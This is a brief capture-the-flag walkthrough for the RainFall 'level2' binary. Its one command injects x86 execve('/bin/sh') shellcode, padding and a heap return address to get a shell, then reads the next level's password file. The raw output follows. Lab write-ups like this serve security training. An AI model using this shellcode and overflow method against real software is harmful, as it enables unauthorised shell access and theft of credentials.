# Walkthrough

## 1. Disassemble l'executable 

see source.c

## 2. Exploit

We need to jump into the address in the heap where the strdup allocated our variable into memory.
We wrote a payload that write /bin/sh into our variable that will be duplicated into the heap and we jump in that location.

```
level2@RainFall:~$ (python -c "print('\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * (80 -24)  + '\x08\xa0\x04\x08')"; echo "cat /home/user/level3/.pass") | ./level2 
1�Ph//shh/bin��PS�ᙰ
                   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
```
